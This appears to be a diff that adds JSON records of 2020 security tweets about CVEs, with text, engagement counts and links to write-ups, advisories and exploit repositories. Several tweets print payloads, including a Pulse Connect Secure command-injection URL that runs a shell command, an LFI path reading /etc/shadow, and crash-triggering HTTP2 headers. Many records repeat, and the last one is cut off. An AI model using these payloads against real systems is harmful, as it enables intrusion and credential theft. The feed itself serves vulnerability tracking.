@@ -2390,3 +2390,1509 @@
     "tweeturl": "https://twitter.com/ptracesecurity/status/1289705496266641408",
     "username": "ptracesecurity"
 }
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 147,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 77,
+    "tweettext": "RCE in Pulse Connect Secure RCE (CVE-2020-8218) &lt; v9.1R8\n\nPOC:\nhttps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever%20-n%20%27($x=%22ls%20/%22,system$x)%3b%20%23%27%20-e%20/data/runtime/tmp/tt/setcookie.thtml.ttc\n https://t.co/u56yPrxO6R",
+    "tweettime": "2020-08-31, 01:33:29",
+    "tweeturl": "https://twitter.com/jas502n/status/1300245292508307456",
+    "username": "jas502n"
+}
+{
+    "expanded_url": [
+        "https://github.com//withdk//pulse-gosecure-rce-poc"
+    ],
+    "tweetfavorites": 90,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "Proof of concept tool to test for the existence of Pulse Secure RCE (CVE-2020-8218) https://t.co/wYv8IzMoFA",
+    "tweettime": "2020-08-30, 06:57:24",
+    "tweeturl": "https://twitter.com/Dinosn/status/1299964418256707586",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 319,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 142,
+    "tweettext": "CVE-2020-8218 : Pulse Secure SSL-VPN post-auth RCE\nCc @chybeta\n\nhxxps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/okL58FZVJU https://t.co/OGxySMF4SM",
+    "tweettime": "2020-08-29, 10:30:52",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1299655751758221319",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 367,
+    "tweetquotes": 6,
+    "tweetreplies": 1,
+    "tweetretweets": 187,
+    "tweettext": "CVE-2020-8218 Pulse Connect Secure post-auth RCE\n\nhttps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/4HZaKORE6s",
+    "tweettime": "2020-08-28, 05:34:56",
+    "tweeturl": "https://twitter.com/chybeta/status/1299218892657586176",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/maxpl0it/CVE-2019-17026-Exploit/"
+    ],
+    "tweetfavorites": 318,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 130,
+    "tweettext": "Published my exploit for CVE-2019-17026 (Firefox JIT bug):\n\nhttps://t.co/YeFsnSVYDv\n\nNo sandbox escape included but if anybody wants a challenge, chain it with CVE-2020-0674 for a neat sandbox escape on Windows!",
+    "tweettime": "2020-08-27, 19:35:33",
+    "tweeturl": "https://twitter.com/maxpl0it/status/1299068051044921347",
+    "username": "maxpl0it"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/"
+    ],
+    "tweetfavorites": 289,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 118,
+    "tweettext": "We are releasing an article about an Authenticated Arbitrary File Read vulnerability (CVE-2019-19499) in Grafana! Dive into Go SQL client libraries, quirks of the MySQL protocol, and more! https://t.co/s5ddu1w7GM",
+    "tweettime": "2020-08-27, 15:11:18",
+    "tweeturl": "https://twitter.com/ptswarm/status/1299001548320600064",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 375,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 150,
+    "tweettext": "If you ever come across an old Apache Solr instance vulnerable to CVE-2017-12629 but are unable to get the XXE working, here's another way to achieve RCE via SSRF in the shards parameter. (Using some @hackvertor syntax for legibility.) https://t.co/WirrolkeIo",
+    "tweettime": "2020-08-26, 14:59:59",
+    "tweeturl": "https://twitter.com/honoki/status/1298636315613974532",
+    "username": "honoki"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "CVE-2020-1380: Analysis of Recently Fixed IE Zero-Day  https://t.co/FKZYgry3BN  #Pentesting #Exploit #Vulnerabilities #CyberSecurity #Infosec https://t.co/Rpc1sNTdzk",
+    "tweettime": "2020-08-26, 09:58:41",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1298560490197716992",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/project-zero/issues/detail?id=2030&q=apache&can=1"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 6,
+    "tweetretweets": 37,
+    "tweettext": "[CVE-2020-9490] Apache2 HTTP2 Push Diary Memory Corruption\n\nPoC (Not include exploit)\n#case1 conn.request('GET', '/', headers={\"Cache-Digest\": \"EA9BQQ==\"})\n#case2 conn.request('GET', '/', headers={\"Cache-Digest\": \"EA8=\"})\n\nFull Python Script in the Pic.\n\nhttps://t.co/LlztMc222a https://t.co/AGU8i6GAhZ",
+    "tweettime": "2020-08-26, 03:38:52",
+    "tweeturl": "https://twitter.com/wugeej/status/1298464906652475395",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 82,
+    "tweettext": "My analysis of the recent Internet Explorer zero-day vulnerability, CVE-2020-1380\n\nhttps://t.co/qo21pj0xii",
+    "tweettime": "2020-08-25, 02:59:00",
+    "tweeturl": "https://twitter.com/iamelli0t/status/1298092483407093761",
+    "username": "iamelli0t"
+}
+{
+    "expanded_url": [
+        "https://github.com/klinix5/Windows-Setup-EoP"
+    ],
+    "tweetfavorites": 39,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 23,
+    "tweettext": "CVE-2020-1571 : Windows Setup Elevation of Privileges Bypass 0day\n\nAffected Version:\nWindows 10 1803/1809/1903/1909/2004\n\nhttps://t.co/uH5DBVXEhT",
+    "tweettime": "2020-08-21, 13:23:53",
+    "tweeturl": "https://twitter.com/perito_inf/status/1296800192256147456",
+    "username": "perito_inf"
+}
+{
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "Finally,he could rce on windows 2008 successful by CVE-2020-1350.This chain spent him too much time.👍",
+    "tweettime": "2020-08-21, 05:56:26",
+    "tweeturl": "https://twitter.com/hackyzh/status/1296687587873230848",
+    "username": "hackyzh"
+}
+{
+    "tweetfavorites": 287,
+    "tweetquotes": 6,
+    "tweetreplies": 12,
+    "tweetretweets": 108,
+    "tweettext": "#DNS #WindowsServer #CVE #EXPLOIT\nDNS 漏洞 CVE-2020-1350 EXPLOIT 新鲜出炉 确定可以导致蠕虫\n\n关于DNS的研究报告在近期可能会分享\n\n堆风水-&gt;堆喷射-&gt;相关数据结构设置-&gt;(利用堆上数据结构任意地址写||信息泄露)-&gt;覆写全局函数指针-&gt;ShellCode 执行 https://t.co/VNfv2CYyrk",
+    "tweettime": "2020-08-21, 05:22:20",
+    "tweeturl": "https://twitter.com/YanZiShuang/status/1296679004343164928",
+    "username": "YanZiShuang"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/windows-update-download.html"
+    ],
+    "tweetfavorites": 221,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 154,
+    "tweettext": "Microsoft issues emergency out-of-band security updates for Windows 8.1, RT 8.1, and Server 2012 R2 systems to patch two recently disclosed privilege escalation bugs (CVE-2020-1530 &amp; CVE-2020-1537) affecting Remote Access Service (RAS).\n\nRead: https://t.co/17sx3z143T\n\n#infosec",
+    "tweettime": "2020-08-20, 17:08:58",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1296494445769166848",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://blog.hiveminds.es/en/posts/cve-2020-1337_my_two_cents/",
+        "https://blog.hiveminds.es/es/posts/cve-2020-1337_mis_dos_centavos/"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 53,
+    "tweettext": "RT @neosysforensics: New blog and new post :)\n\nCVE-2020-1337: my two cents\nhttps://t.co/YxZOdG5rSA\n\nAlso in spanish\nhttps://t.co/x08zMvkGSK…",
+    "tweettime": "2020-08-19, 13:09:37",
+    "tweeturl": "https://twitter.com/jedisct1/status/1296071824657326081",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://blog.hiveminds.es/en/posts/cve-2020-1337_my_two_cents/",
+        "https://blog.hiveminds.es/es/posts/cve-2020-1337_mis_dos_centavos/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "New blog and new post :)\n\nCVE-2020-1337: my two cents\nhttps://t.co/YxZOdG5rSA\n\nAlso in spanish\nhttps://t.co/x08zMvkGSK\n\nThx to @h4ng3r and the rest of the crew!",
+    "tweettime": "2020-08-19, 11:26:01",
+    "tweeturl": "https://twitter.com/neosysforensics/status/1296045753610182657",
+    "username": "neosysforensics"
+}
+{
+    "expanded_url": [
+        "https://tinyurl.com/yy5va7py"
+    ],
+    "tweetfavorites": 51,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 37,
+    "tweettext": "[Blog] Windows AppX Deployment Service Local Privilege Escalation (CVE-2020-1488) https://t.co/HfsOdyAtKM",
+    "tweettime": "2020-08-18, 17:30:28",
+    "tweeturl": "https://twitter.com/ihack4falafel/status/1295775079855529984",
+    "username": "ihack4falafel"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 68,
+    "tweettext": "RT @thezdi: Windows Print Spooler Patch Bypass Re-Enables Persistent Backdoor. @HexKitchen details how the patch for CVE-2020-1048 was easi…",
+    "tweettime": "2020-08-17, 16:33:32",
+    "tweeturl": "https://twitter.com/binitamshah/status/1295398366239535104",
+    "username": "binitamshah"
+}
+{
+    "expanded_url": [
+        "https://github.com/klinix5/Windows-Setup-EoP"
+    ],
+    "tweetfavorites": 137,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 80,
+    "tweettext": "CVE-2020-1571 Windows Setup Elevation of Privileges Bypass 0day  https://t.co/cYoe2PnKZT  #Pentesting #Windows #Vulnerability #CVE #Infosec https://t.co/3H38QKJWA0",
+    "tweettime": "2020-08-15, 16:40:21",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1294675304871534592",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://cwiki.apache.org/confluence/display/WW/S2-059"
+    ],
+    "tweetfavorites": 237,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 102,
+    "tweettext": "Apache Struts RCE: S2-059 / CVE-2019-0230\n\nhttps://t.co/m6z3jqRsj4\n\nForced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution. https://t.co/6JwZCozTeB",
+    "tweettime": "2020-08-13, 17:41:35",
+    "tweeturl": "https://twitter.com/chybeta/status/1293965938388119553",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2020-9496 Apache OFBiz PRE-AUTH RCE \n\nadvisory: https://t.co/rsmAgGmzoa https://t.co/ChaSFoeXO8",
+    "tweettime": "2020-08-13, 10:15:02",
+    "tweeturl": "https://twitter.com/chybeta/status/1293853562489810946",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 117,
+    "tweettext": "RT @TheHackersNews: Here are technical details for a new Windows Remote Access elevation of privilege #vulnerability (CVE-2020-1530) for wh…",
+    "tweettime": "2020-08-12, 19:35:42",
+    "tweeturl": "https://twitter.com/jedisct1/status/1293632271749087232",
+    "username": "jedisct1"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/microsoft-software-patches.html"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 25,
+    "tweettext": "One of the zero-day vulnerabilities under active attack is a remote code execution bug (CVE-2020-1380) affecting Internet Explorer.\n\nhttps://t.co/JaFIg6obtV\n\nSpotted by @kaspersky experts, unknown threat actors are exploiting this issue as part of 'Operation PowerFall' attacks. https://t.co/ctEVtIdYfI",
+    "tweettime": "2020-08-12, 18:54:56",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293622012133310464",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html",
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1530"
+    ],
+    "tweetfavorites": 197,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 117,
+    "tweettext": "Here are technical details for a new Windows Remote Access elevation of privilege #vulnerability (CVE-2020-1530) for which #Microsoft released a security patch yesterday.\n\nhttps://t.co/QaL3a1DbzC\n\nAdvisory: https://t.co/Nsc5X1cc5m\n\n#PatchTuesday https://t.co/QTQajyZluF",
+    "tweettime": "2020-08-12, 18:03:46",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293609136605675520",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 224,
+    "tweetquotes": 6,
+    "tweetreplies": 1,
+    "tweetretweets": 87,
+    "tweettext": "CVE-2020-9697: Info disclosure in #Adobe Reader. \n\nPoC: \nvar a = app.measureDialog(app);\nconsole.println(\"Escript Base: \" + (Math.abs(a[1]) - 0x0044b43).toString(16)) https://t.co/dpxYcvLnca",
+    "tweettime": "2020-08-12, 15:22:53",
+    "tweeturl": "https://twitter.com/thezdi/status/1293568647043190784",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://support.citrix.com/article/CTX277457"
+    ],
+    "tweetfavorites": 136,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 78,
+    "tweettext": "The advisory for an Unauthenticated Arbitrary File Read vulnerability in Citrix XenMobile (CVE-2020-8209) found by our researcher Andrey Medov is now out! The fixes were released privately 3 weeks ago, so we hope a lot of companies are protected now 🙂 https://t.co/iWT0CBneTu https://t.co/NpIyV6gzga",
+    "tweettime": "2020-08-12, 14:07:00",
+    "tweeturl": "https://twitter.com/ptswarm/status/1293549550066642946",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://symeonp.github.io/2020/12/08/phonebook-uaf-analysis.html"
+    ],
+    "tweetfavorites": 341,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 153,
+    "tweettext": "Yesterday's Patch Tuesday included a PhoneBook use-after-free vulnerability (CVE-2020-1530) I reported. I decided to do a step-by-step write up on how I discovered it. It covers some basic sample gathering, harnessing, fuzzing, analysis and exploitation https://t.co/Uvyvy8CqX1",
+    "tweettime": "2020-08-12, 12:56:28",
+    "tweeturl": "https://twitter.com/symeonp/status/1293531800325754891",
+    "username": "symeonp"
+}
+{
+    "expanded_url": [
+        "https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/"
+    ],
+    "tweetfavorites": 89,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 58,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit  https://t.co/PRJBBTvpRL  #Apache #Java #RCE #Explot #CyberSecurity #Infosec https://t.co/eIK7DCWHAe",
+    "tweettime": "2020-08-12, 04:47:51",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1293408837060501505",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://go.usa.gov/xfArr"
+    ],
+    "tweetfavorites": 94,
+    "tweetquotes": 11,
+    "tweetreplies": 0,
+    "tweetretweets": 113,
+    "tweettext": "Microsoft’s #PatchTuesday updates include patches for two vulnerabilities—CVE-2020-1380 and CVE-2020-1464—being actively exploited. Update ASAP to protect your systems. https://t.co/FEPH4f2y7S #Cyber #Cybersecurity #InfoSec",
+    "tweettime": "2020-08-11, 19:06:37",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1293262564529508352",
+    "username": "USCERT_gov"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/33Qh3go"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 68,
+    "tweettext": "Windows Print Spooler Patch Bypass Re-Enables Persistent Backdoor. @HexKitchen details how the patch for CVE-2020-1048 was easily bypassed and looks at the new patch released today to fix it. https://t.co/ayeIQC0CQV",
+    "tweettime": "2020-08-11, 18:14:56",
+    "tweeturl": "https://twitter.com/thezdi/status/1293249558768746496",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://github.com/math1as/CVE-2020-1337-exploit"
+    ],
+    "tweetfavorites": 224,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 99,
+    "tweettext": "Oh it's patch tuesday.\nI'm happy to release the exploit of CVE-2020-1337 , this year's leet CVE-ID. also known as windows print spooler privilege escalation bug.\nthanks @md5_salt for the great idea.\nhttps://t.co/GxtUqoSMQM",
+    "tweettime": "2020-08-11, 17:18:16",
+    "tweeturl": "https://twitter.com/Ma7h1as/status/1293235295337381889",
+    "username": "Ma7h1as"
+}
+{
+    "expanded_url": [
+        "https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) – write-up and exploit\n\nhttps://t.co/lmFgh6v6Gu",
+    "tweettime": "2020-08-11, 15:35:30",
+    "tweeturl": "https://twitter.com/FlatL1ne/status/1293209434345426945",
+    "username": "FlatL1ne"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2020/08/vBulletin-vulnerability-exploit.html"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 54,
+    "tweettext": "🔥 Watch Out! A new critical #vBulletin zero-day RCE #vulnerability and its PoC exploits have been publicly disclosed, allowing attackers to bypass patch for an old RCE bug (CVE-2019-16759) and remotely compromise sites.\n\nDetails — https://t.co/961xiq1BqC\n\n#infosec #cybersecurity",
+    "tweettime": "2020-08-11, 13:48:53",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1293182603751694336",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://honoki.net/2020/08/10/cve-2020-11518-how-i-bruteforced-my-way-into-your-active-directory/"
+    ],
+    "tweetfavorites": 1061,
+    "tweetquotes": 17,
+    "tweetreplies": 24,
+    "tweetretweets": 423,
+    "tweettext": "I'm celebrating my first CVE with a writeup! Hope you enjoy it.  🤓\n\n\"CVE-2020-11518: how I bruteforced my way into your Active Directory\"\n\nhttps://t.co/aHKeF7Q3lE\n\n#bugbounty #writeup #blogpost #blog https://t.co/aiweywp3ne",
+    "tweettime": "2020-08-10, 18:04:07",
+    "tweeturl": "https://twitter.com/honoki/status/1292884449110249474",
+    "username": "honoki"
+}
+{
+    "expanded_url": [
+        "https://www.bleepingcomputer.com/news/security/fbi-iranian-hackers-trying-to-exploit-critical-f5-big-ip-flaw/"
+    ],
+    "tweetfavorites": 95,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 49,
+    "tweettext": "The FBI warns of Iranian hackers actively attempting to exploit vulnerable F5 Big-IP ADC devices unpatched against the CVE-2020-5902 unauthenticated remote code execution flaw - @serghei\nhttps://t.co/rcwTyZnqE6",
+    "tweettime": "2020-08-08, 09:00:12",
+    "tweeturl": "https://twitter.com/BleepinComputer/status/1292022789059248128",
+    "username": "BleepinComputer"
+}
+{
+    "expanded_url": [
+        "https://github.com/lucxssouza/CVE-2020-13886"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 40,
+    "tweettext": "CVE-2020-13886 0day INTELBRAS TELEFONE IP TIP200/200 LITE &amp; TIP 300 - Local File Include\n\n[ Proof Of Concept ]\nURL parameter -&gt;http://HOST/cgi-bin/cgiServer.exx?page=\n\nLFI payload -&gt; ../../../../etc/shadow\n\nhttps://t.co/fQEOI2WZsF https://t.co/ixlAj26tAM",
+    "tweettime": "2020-08-06, 01:28:21",
+    "tweeturl": "https://twitter.com/wugeej/status/1291184302672158720",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://behindthebreach.com/l/46"
+    ],
+    "tweetfavorites": 119,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "Apache Tomcat RCE by deserialization (CVE-2020-9484) - write-up and exploit https://t.co/YygbwhoXTd #vulnerability #collection #execution #cve_2020_9484 #apache #tomcat",
+    "tweettime": "2020-08-05, 04:00:07",
+    "tweeturl": "https://twitter.com/behindthebreach/status/1290860109053284353",
+    "username": "behindthebreach"
+}
+{
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 29,
+    "tweettext": "I have just finished the recent IBM Websphere RCE PoC (CVE-2020-4450). It's a nice chain and after all I have learnt many things! https://t.co/JWRiiy7MEM",
+    "tweettime": "2020-08-04, 16:34:24",
+    "tweeturl": "https://twitter.com/peterjson/status/1290687541188767745",
+    "username": "peterjson"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/openfire-admin-console/"
+    ],
+    "tweetfavorites": 254,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 112,
+    "tweettext": "OpenFire allows to get Arbitrary File Read and Unauthenticated Full Read SSRF via its 9090/http and 9091/https ports. The details are in the article by Alexandr Shvetsov (CVE-2019-18393 &amp; CVE-2019-18394): https://t.co/8LTBkwxQaL https://t.co/gpUx8Bos9i",
+    "tweettime": "2020-08-04, 14:46:04",
+    "tweeturl": "https://twitter.com/ptswarm/status/1290660280372994054",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://blog.vincss.net/2020/06/cve49-microsoft-windows-lnk-remote-code-execution-vuln-cve-2020-1299-eng.html"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 37,
+    "tweettext": "[CVE49] Microsoft Windows LNK Remote Code Execution Vulnerability - CVE-2020-1299  https://t.co/R1oLe81oUw  #Windows #Vulnerability #RCE #CVE #LNK #Infosec https://t.co/DTeuz9GZip",
+    "tweettime": "2020-08-01, 23:32:06",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1289705496266641408",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 147,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 77,
+    "tweettext": "RCE in Pulse Connect Secure RCE (CVE-2020-8218) &lt; v9.1R8\n\nPOC:\nhttps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever%20-n%20%27($x=%22ls%20/%22,system$x)%3b%20%23%27%20-e%20/data/runtime/tmp/tt/setcookie.thtml.ttc\n https://t.co/u56yPrxO6R",
+    "tweettime": "2020-08-31, 01:33:29",
+    "tweeturl": "https://twitter.com/jas502n/status/1300245292508307456",
+    "username": "jas502n"
+}
+{
+    "expanded_url": [
+        "https://github.com//withdk//pulse-gosecure-rce-poc"
+    ],
+    "tweetfavorites": 90,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "Proof of concept tool to test for the existence of Pulse Secure RCE (CVE-2020-8218) https://t.co/wYv8IzMoFA",
+    "tweettime": "2020-08-30, 06:57:24",
+    "tweeturl": "https://twitter.com/Dinosn/status/1299964418256707586",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 319,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 142,
+    "tweettext": "CVE-2020-8218 : Pulse Secure SSL-VPN post-auth RCE\nCc @chybeta\n\nhxxps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/okL58FZVJU https://t.co/OGxySMF4SM",
+    "tweettime": "2020-08-29, 10:30:52",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1299655751758221319",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 367,
+    "tweetquotes": 6,
+    "tweetreplies": 1,
+    "tweetretweets": 187,
+    "tweettext": "CVE-2020-8218 Pulse Connect Secure post-auth RCE\n\nhttps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/4HZaKORE6s",
+    "tweettime": "2020-08-28, 05:34:56",
+    "tweeturl": "https://twitter.com/chybeta/status/1299218892657586176",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/maxpl0it/CVE-2019-17026-Exploit/"
+    ],
+    "tweetfavorites": 318,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 130,
+    "tweettext": "Published my exploit for CVE-2019-17026 (Firefox JIT bug):\n\nhttps://t.co/YeFsnSVYDv\n\nNo sandbox escape included but if anybody wants a challenge, chain it with CVE-2020-0674 for a neat sandbox escape on Windows!",
+    "tweettime": "2020-08-27, 19:35:33",
+    "tweeturl": "https://twitter.com/maxpl0it/status/1299068051044921347",
+    "username": "maxpl0it"
+}
+{
+    "expanded_url": [
+        "https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/"
+    ],
+    "tweetfavorites": 289,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 118,
+    "tweettext": "We are releasing an article about an Authenticated Arbitrary File Read vulnerability (CVE-2019-19499) in Grafana! Dive into Go SQL client libraries, quirks of the MySQL protocol, and more! https://t.co/s5ddu1w7GM",
+    "tweettime": "2020-08-27, 15:11:18",
+    "tweeturl": "https://twitter.com/ptswarm/status/1299001548320600064",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 375,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 150,
+    "tweettext": "If you ever come across an old Apache Solr instance vulnerable to CVE-2017-12629 but are unable to get the XXE working, here's another way to achieve RCE via SSRF in the shards parameter. (Using some @hackvertor syntax for legibility.) https://t.co/WirrolkeIo",
+    "tweettime": "2020-08-26, 14:59:59",
+    "tweeturl": "https://twitter.com/honoki/status/1298636315613974532",
+    "username": "honoki"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "CVE-2020-1380: Analysis of Recently Fixed IE Zero-Day  https://t.co/FKZYgry3BN  #Pentesting #Exploit #Vulnerabilities #CyberSecurity #Infosec https://t.co/Rpc1sNTdzk",
+    "tweettime": "2020-08-26, 09:58:41",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1298560490197716992",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/project-zero/issues/detail?id=2030&q=apache&can=1"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 1,
+    "tweetreplies": 6,
+    "tweetretweets": 37,
